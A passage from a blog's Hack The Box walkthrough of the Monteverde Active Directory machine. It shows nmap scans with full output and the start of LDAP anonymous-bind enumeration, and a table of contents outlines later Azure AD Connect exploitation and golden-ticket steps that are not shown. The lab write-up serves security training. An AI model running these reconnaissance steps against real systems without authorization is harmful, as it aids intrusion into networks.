<!DOCTYPE html>
<html lang="en-us">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    
    <meta name="generator" content="Hugo 0.135.0">

    <script src="js/custom.js"></script>
    

    

    
        
            <meta
                name="description"
                content="Bones &amp; All Cyber Security" />
        

        
            <meta
                name="keywords"
                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
        

        
            <meta name="author" content="bloodstiller" />
        

    


    <title>
        
            Monteverde HTB Walkthrough |
            Hack the planet
        
    </title>

    


    
    

    
    


    
    


    
    


    
    

    


    
    

    

    

        
            
            <link
                rel="stylesheet"
                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/02_style.8484c853cc558c1c2189842f955ad4be9bf66854698f03f140aef3cfc23174c78eb1ab05b915b7877afac7464e5d70d467c87c1fb3fcbe11a75d379de01e0798.css"
                integrity="sha512-hITIU8xVjBwhiYQvlVrUvpv2aFRpjwPxQK7zz8IxdMeOsasFuRW3h3r6x0ZOXXDUZ8h8H7P8vhGnXTed4B4HmA==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
        

    


    
    

    

    

    

    


</head>



    <body>
        <header class="header">
    <div class="header_left">
        
    </div>

    <div class="header_middle">
        
            Monteverde HTB Walkthrough -
            Hack the planet
        
    </div>
</header>



        <main>
            <aside class="sidebar">
    



    
    

    
    


    <ul class="section-tree">
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Cheatsheets </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/cheatsheets/rpc-cheatsheet/" title="./cheatsheets/rpc-cheatsheet/">
                        
                            RPC Cheat Sheet
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir closed-dir"
                    >
                    <span class="dir-text"> Articles </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/azureadconnectattack/" title="./articles/azureadconnectattack/">
                        
                            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
                        
                            Understanding the Shadow Credentials Attack Vector
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
                        
                            Understanding .NET Deserialization Exploits: A Deep Dive
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li
                    
                        class="dir opened-dir"
                    >
                    <span class="dir-text"> Walkthroughs </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/monteverde-box/" title="./walkthroughs/monteverde-box/">
                        
                            Monteverde HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/outdated-box/" title="./walkthroughs/outdated-box/">
                        
                            Outdated HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
                        
                            Scrambled HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
                        
                            Escape HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
                        
                            Hospital HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
                        
                            Intelligence HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
                        
                            Manager HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
                        
                            Access HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
                        
                            Remote HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
                        
                            Support HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
                        
                            Return HTB Walkthrough
                        
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/cascade-box/" title="./cascade-box/">
                        
                            Cascade HTB Walkthrough
                        
                    </a>
                </li>
            
        
            
                <li class="file">
                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
                        
                            about me
                        
                    </a>
                </li>
            
        
    </ul>


</aside>
<aside class="exapandable"></aside>


            
    <article class="main">
        <button
    class="sidebar-toggle-btn"
    type="menu"
    aria-expanded="false"
    aria-haspopup="true">
    <i class="bi bi-list"></i>
</button>



        <div class="title">
            <h1 class="title-header">
                Monteverde HTB Walkthrough
            </h1>

            <div class="author-date-readtime">
                

                    
                        <div class="author" title="Author">
                            <i class="bi bi-person"></i>
                            <a
                                href="/author/bloodstiller/"
                                class="cat-btn">
                                bloodstiller
                            </a>
                        </div>
                    

                

                
                    <div class="date" title="Date">
                        <i class="bi bi-calendar3"></i>
                        <time
                            datetime="2024.14.10"
                            >2024.14.10
                        </time>
                    </div>
                

                
                    <div
                        class="readtime"
                        title="Time to Read">
                        <i class="bi bi-clock"></i>
                        15 mins to read
                    </div>
                
            </div>
        </div>

        <div class="article-meta">
            

            
                <div class="tags">
                    <i
                        class="bi bi-tags"
                        title="Tags"></i>
                    
                        <a
                            href="/tags/box/"
                            class="tag-btn">
                            Box
                        </a>
                    
                        <a
                            href="/tags/htb/"
                            class="tag-btn">
                            HTB
                        </a>
                    
                        <a
                            href="/tags/medium/"
                            class="tag-btn">
                            Medium
                        </a>
                    
                        <a
                            href="/tags/windows/"
                            class="tag-btn">
                            Windows
                        </a>
                    
                        <a
                            href="/tags/ldap/"
                            class="tag-btn">
                            LDAP
                        </a>
                    
                        <a
                            href="/tags/active-directory/"
                            class="tag-btn">
                            Active Directory
                        </a>
                    
                        <a
                            href="/tags/azure-ad-connect/"
                            class="tag-btn">
                            Azure AD Connect
                        </a>
                    
                        <a
                            href="/tags/azure/"
                            class="tag-btn">
                            Azure
                        </a>
                    
                        <a
                            href="/tags/sql/"
                            class="tag-btn">
                            SQL
                        </a>
                    
                        <a
                            href="/tags/mssql/"
                            class="tag-btn">
                            MSSQL
                        </a>
                    
                </div>
            

            
                <div class="breadcumb">
                    <i class="bi bi-folder"></i>
                    
    
    




<a href="http://localhost:1313/" class="bread-btn">
    
        <i class="bi bi-house-fill"></i>
    

    
        Home
    
</a>




    /



<a href="http://localhost:1313/walkthroughs/" class="bread-btn">
    

    
        Walkthroughs
    
</a>




    /



<a href="http://localhost:1313/walkthroughs/monteverde-box/" class="bread-btn">
    

    
        
            Monteverde HTB Walkthrough
        

    
</a>

                </div>
            

            
        </div>

        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#monteverde-hack-the-box-walkthrough-writeup">Monteverde Hack The Box Walkthrough/Writeup:</a></li>
    <li><a href="#how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</a></li>
    <li><a href="#1-dot-enumeration">1. Enumeration:</a>
      <ul>
        <li><a href="#nmap">NMAP:</a></li>
        <li><a href="#ldap-389">LDAP <code>389</code>:</a></li>
        <li><a href="#dns-53">DNS <code>53</code>:</a></li>
        <li><a href="#kerberos-88">Kerberos <code>88</code>:</a></li>
        <li><a href="#smb-445">SMB <code>445</code>:</a></li>
      </ul>
    </li>
    <li><a href="#2-dot-foothold">2. Foothold:</a>
      <ul>
        <li><a href="#enumerating-the-domain-sabatchjobs">Enumerating the Domain <code>SABatchJobs</code>:</a></li>
        <li><a href="#finding-a-hard-coded-password-in-azure-dot-xml">Finding a hard-coded password in <code>azure.xml</code>:</a></li>
        <li><a href="#discovering-that-mhope-re-uses-passwords">Discovering that <code>mhope</code> re-uses passwords:</a></li>
        <li><a href="#connecting-to-the-host-as-mhope">Connecting to the host as <code>mhope</code>:</a></li>
      </ul>
    </li>
    <li><a href="#3-dot-privilege-escalation">3. Privilege Escalation:</a>
      <ul>
        <li><a href="#discovering-mhope-is-part-of-the-azure-admins-group">Discovering <code>mhope</code> is part of the <code>azure admins</code> group:</a></li>
        <li><a href="#enumerating-the-azure-service">Enumerating the Azure Service:</a></li>
        <li><a href="#connecting-to-the-sql-instance">Connecting to the <code>SQL</code> Instance:</a></li>
      </ul>
    </li>
    <li><a href="#4-dot-ownership">4. Ownership:</a>
      <ul>
        <li><a href="#modifying-xpn-s-poc-to-work">Modifying XPN&rsquo;s POC to work:</a></li>
        <li><a href="#running-the-exploit-to-extract-the-administrator-password">Running the Exploit to Extract the Administrator Password:</a></li>
      </ul>
    </li>
    <li><a href="#5-dot-persistence">5. Persistence:</a>
      <ul>
        <li><a href="#dumping-ntds-dot-dit">Dumping <code>NTDS.dit</code>:</a></li>
        <li><a href="#creating-a-golden-ticket">Creating a Golden Ticket:</a></li>
      </ul>
    </li>
    <li><a href="#lessons-learned">Lessons Learned:</a>
      <ul>
        <li><a href="#what-did-i-learn">What did I learn?</a></li>
        <li><a href="#what-silly-mistakes-did-i-make">What silly mistakes did I make?</a></li>
      </ul>
    </li>
    <li><a href="#sign-off">Sign off:</a></li>
  </ul>
</nav>
        


        <div class="content">
            
                <h2 id="monteverde-hack-the-box-walkthrough-writeup">Monteverde Hack The Box Walkthrough/Writeup:</h2>
<ul>
<li><a href="https://app.hackthebox.com/machines/Monteverde">https://app.hackthebox.com/machines/Monteverde</a></li>
</ul>
<h2 id="how-i-use-variables-and-wordlists">How I use variables &amp; Wordlists:</h2>
<ul>
<li><strong>Variables</strong>:
<ul>
<li>In my commands you are going to see me use <code>$box</code>, <code>$user</code>, <code>$hash</code>, <code>$domain</code>, <code>$pass</code> often.
<ul>
<li>I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
<ul>
<li><code>$box</code> = The IP of the box</li>
<li><code>$pass</code> = Passwords I have access to.</li>
<li><code>$user</code> = current user I am enumerating with.
<ul>
<li>Depending on where I am in the process this can change if I move laterally.</li>
</ul>
</li>
<li><code>$domain</code> = the domain name e.g. <code>sugarape.local</code> or <code>contoso.local</code></li>
<li><code>$pass</code> = Passwords I have access to.</li>
</ul>
</li>
<li>Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.</li>
</ul>
</li>
</ul>
</li>
<li><strong>Wordlists</strong>:
<ul>
<li>I have symlinks all setup so I can get to my passwords from <code>~/Wordlists</code> so if you see me using that path that&rsquo;s why. If you are on Kali and following on, you will need to go to <code>/usr/share/wordlists</code>
<ul>
<li>I also use these additional wordlists:
<ul>
<li><a href="https://github.com/insidetrust/statistically-likely-usernames">Statistically-likely-usernames</a></li>
<li><a href="https://github.com/danielmiessler/SecLists">SecLists</a></li>
<li><a href="https://github.com/carlospolop/Auto_Wordlists">Auto_Wordlists</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="1-dot-enumeration">1. Enumeration:</h2>
<h3 id="nmap">NMAP:</h3>
<ul>
<li>
<p><strong>Basic Scan</strong>:</p>
<ul>
<li><code>nmap $box -Pn -oA basicScan</code>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="%20%20kali%20in%2046.02-HTB/BlogEntriesMade/Monteverde_Unfinished/scans/nmap%20%202GiB/15GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%20%20%f0%9f%95%99%2011:24:32%20zsh%20%e2%9d%af%20nmap%20$box%20-Pn%20-oA%20basicScan%0a%20%20Starting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-10-13%2011:24%20BST%0a%20%20Nmap%20scan%20report%20for%2010.129.228.111%0a%20%20Host%20is%20up%20%280.040s%20latency%29.%0a%20%20Not%20shown:%20989%20filtered%20tcp%20ports%20%28no-response%29%0a%20%20PORT%20%20%20%20%20STATE%20SERVICE%0a%20%2053/tcp%20%20%20open%20%20domain%0a%20%2088/tcp%20%20%20open%20%20kerberos-sec%0a%20%20135/tcp%20%20open%20%20msrpc%0a%20%20139/tcp%20%20open%20%20netbios-ssn%0a%20%20389/tcp%20%20open%20%20ldap%0a%20%20445/tcp%20%20open%20%20microsoft-ds%0a%20%20464/tcp%20%20open%20%20kpasswd5%0a%20%20593/tcp%20%20open%20%20http-rpc-epmap%0a%20%20636/tcp%20%20open%20%20ldapssl%0a%20%203268/tcp%20open%20%20globalcatLDAP%0a%20%203269/tcp%20open%20%20globalcatLDAPssl%0a%0a%20%20Nmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%2012.51%20seconds">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  kali in 46.02-HTB/BlogEntriesMade/Monteverde_Unfinished/scans/nmap  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>  üïô 11:24:32 zsh ‚ùØ nmap $box -Pn -oA basicScan
</span></span><span style="display:flex;"><span>  Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-13 11:24 BST
</span></span><span style="display:flex;"><span>  Nmap scan report <span style="color:#66d9ef">for</span> 10.129.228.111
</span></span><span style="display:flex;"><span>  Host is up <span style="color:#f92672">(</span>0.040s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>  Not shown: <span style="color:#ae81ff">989</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  PORT     STATE SERVICE
</span></span><span style="display:flex;"><span>  53/tcp   open  domain
</span></span><span style="display:flex;"><span>  88/tcp   open  kerberos-sec
</span></span><span style="display:flex;"><span>  135/tcp  open  msrpc
</span></span><span style="display:flex;"><span>  139/tcp  open  netbios-ssn
</span></span><span style="display:flex;"><span>  389/tcp  open  ldap
</span></span><span style="display:flex;"><span>  445/tcp  open  microsoft-ds
</span></span><span style="display:flex;"><span>  464/tcp  open  kpasswd5
</span></span><span style="display:flex;"><span>  593/tcp  open  http-rpc-epmap
</span></span><span style="display:flex;"><span>  636/tcp  open  ldapssl
</span></span><span style="display:flex;"><span>  3268/tcp open  globalcatLDAP
</span></span><span style="display:flex;"><span>  3269/tcp open  globalcatLDAPssl
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 12.51 seconds</span></span></code></pre></div>
    
</div>
</li>
<li><strong>Initial thoughts</strong>:
<ul>
<li>DNS, Kerberos, LDAP &amp; SMB give us great starting points for enumeration.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>In depth scan</strong>:</p>
<ul>
<li><code>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP</code>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="%0a%20%20kali%20in%2046.02-HTB/BlogEntriesMade/Monteverde_Unfinished/scans/nmap%20%202GiB/15GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%20%20took%2012s%0a%20%20%f0%9f%95%99%2011:24:49%20zsh%20%e2%9d%af%20sudo%20nmap%20-p-%20-sV%20-sC%20-O%20-Pn%20--disable-arp-ping%20$box%20-oA%20FullTCP%0a%20%20Starting%20Nmap%207.94SVN%20%28%20https://nmap.org%20%29%20at%202024-10-13%2011:25%20BST%0a%20%20Nmap%20scan%20report%20for%2010.129.228.111%0a%20%20Host%20is%20up%20%280.071s%20latency%29.%0a%20%20Not%20shown:%2065516%20filtered%20tcp%20ports%20%28no-response%29%0a%20%20PORT%20%20%20%20%20%20STATE%20SERVICE%20%20%20%20%20%20%20VERSION%0a%20%2053/tcp%20%20%20%20open%20%20domain%20%20%20%20%20%20%20%20Simple%20DNS%20Plus%0a%20%2088/tcp%20%20%20%20open%20%20kerberos-sec%20%20Microsoft%20Windows%20Kerberos%20%28server%20time:%202024-10-13%2010:28:37Z%29%0a%20%20135/tcp%20%20%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%20139/tcp%20%20%20open%20%20netbios-ssn%20%20%20Microsoft%20Windows%20netbios-ssn%0a%20%20389/tcp%20%20%20open%20%20ldap%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20MEGABANK.LOCAL0.,%20Site:%20Default-First-Site-Name%29%0a%20%20445/tcp%20%20%20open%20%20microsoft-ds?%0a%20%20464/tcp%20%20%20open%20%20kpasswd5?%0a%20%20593/tcp%20%20%20open%20%20ncacn_http%20%20%20%20Microsoft%20Windows%20RPC%20over%20HTTP%201.0%0a%20%20636/tcp%20%20%20open%20%20tcpwrapped%0a%20%203268/tcp%20%20open%20%20ldap%20%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20Active%20Directory%20LDAP%20%28Domain:%20MEGABANK.LOCAL0.,%20Site:%20Default-First-Site-Name%29%0a%20%203269/tcp%20%20open%20%20tcpwrapped%0a%20%205985/tcp%20%20open%20%20http%20%20%20%20%20%20%20%20%20%20Microsoft%20HTTPAPI%20httpd%202.0%20%28SSDP/UPnP%29%0a%20%20%7c_http-server-header:%20Microsoft-HTTPAPI/2.0%0a%20%20%7c_http-title:%20Not%20Found%0a%20%209389/tcp%20%20open%20%20mc-nmf%20%20%20%20%20%20%20%20.NET%20Message%20Framing%0a%20%2049667/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%2049673/tcp%20open%20%20ncacn_http%20%20%20%20Microsoft%20Windows%20RPC%20over%20HTTP%201.0%0a%20%2049674/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%2049676/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%2049696/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%2049796/tcp%20open%20%20msrpc%20%20%20%20%20%20%20%20%20Microsoft%20Windows%20RPC%0a%20%20Warning:%20OSScan%20results%20may%20be%20unreliable%20because%20we%20could%20not%20find%20at%20least%201%20open%20and%201%20closed%20port%0a%20%20Device%20type:%20general%20purpose%0a%20%20Running%20%28JUST%20GUESSING%29:%20Microsoft%20Windows%202019%20%2888%25%29%0a%20%20Aggressive%20OS%20guesses:%20Microsoft%20Windows%20Server%202019%20%2888%25%29%0a%20%20No%20exact%20OS%20matches%20for%20host%20%28test%20conditions%20non-ideal%29.%0a%20%20Service%20Info:%20Host:%20MONTEVERDE;%20OS:%20Windows;%20CPE:%20cpe:/o:microsoft:windows%0a%0a%20%20Host%20script%20results:%0a%20%20%7c%20smb2-time:%0a%20%20%7c%20%20%20date:%202024-10-13T10:29:42%0a%20%20%7c_%20%20start_date:%20N/A%0a%20%20%7c%20smb2-security-mode:%0a%20%20%7c%20%20%203:1:1:%0a%20%20%7c_%20%20%20%20Message%20signing%20enabled%20and%20required%0a%0a%20%20OS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0a%20%20Nmap%20done:%201%20IP%20address%20%281%20host%20up%29%20scanned%20in%20304.90%20seconds">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  kali in 46.02-HTB/BlogEntriesMade/Monteverde_Unfinished/scans/nmap  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh  took 12s
</span></span><span style="display:flex;"><span>  üïô 11:24:49 zsh ‚ùØ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
</span></span><span style="display:flex;"><span>  Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-13 11:25 BST
</span></span><span style="display:flex;"><span>  Nmap scan report <span style="color:#66d9ef">for</span> 10.129.228.111
</span></span><span style="display:flex;"><span>  Host is up <span style="color:#f92672">(</span>0.071s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>  Not shown: <span style="color:#ae81ff">65516</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  PORT      STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span>  53/tcp    open  domain        Simple DNS Plus
</span></span><span style="display:flex;"><span>  88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-10-13 10:28:37Z<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>  139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>  389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  445/tcp   open  microsoft-ds?
</span></span><span style="display:flex;"><span>  464/tcp   open  kpasswd5?
</span></span><span style="display:flex;"><span>  593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>  636/tcp   open  tcpwrapped
</span></span><span style="display:flex;"><span>  3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  3269/tcp  open  tcpwrapped
</span></span><span style="display:flex;"><span>  5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  |_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>  |_http-title: Not Found
</span></span><span style="display:flex;"><span>  9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span style="display:flex;"><span>  49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>  49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>  49674/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>  49676/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>  49696/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>  49796/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>  Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
</span></span><span style="display:flex;"><span>  Device type: general purpose
</span></span><span style="display:flex;"><span>  Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>88%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>88%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>  Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Host script results:
</span></span><span style="display:flex;"><span>  | smb2-time:
</span></span><span style="display:flex;"><span>  |   date: 2024-10-13T10:29:42
</span></span><span style="display:flex;"><span>  |_  start_date: N/A
</span></span><span style="display:flex;"><span>  | smb2-security-mode:
</span></span><span style="display:flex;"><span>  |   3:1:1:
</span></span><span style="display:flex;"><span>  |_    Message signing enabled and required
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>  Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 304.90 seconds</span></span></code></pre></div>
    
</div>
</li>
<li><strong>Findings</strong>:
<ul>
<li>SMB Signing is enabled so no relay attacks.</li>
<li>We seem to be dealing with server 2019.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="ldap-389">LDAP <code>389</code>:</h3>
<h4 id="using-ldap-anonymous-bind-to-enumerate-further">Using LDAP anonymous bind to enumerate further:</h4>
<ul>
<li>If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
<ul>
<li>We can actually retrieve a significant amount of information via anonymous bind such as:
<ul>
<li>A list of all users</li>
<li>A list of all groups</li>
<li>A list of all computers.</li>
<li>User account attributes.</li>
<li>The domain password policy.</li>
<li>Enumerate users who are susceptible to AS-REPRoasting.</li>
<li>Passwords stored in the description fields</li>
</ul>
</li>
<li>The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here</p>
<ul>
<li><a href="https://github.com/bloodstiller/ldapchecker">https://github.com/bloodstiller/ldapchecker</a>
<ul>
<li><code>python3 ldapchecker.py $box</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p>It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.</p>
<ol>
<li>
<p><!-- raw HTML omitted -->We have the naming context of the domain<!-- raw HTML omitted -->:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
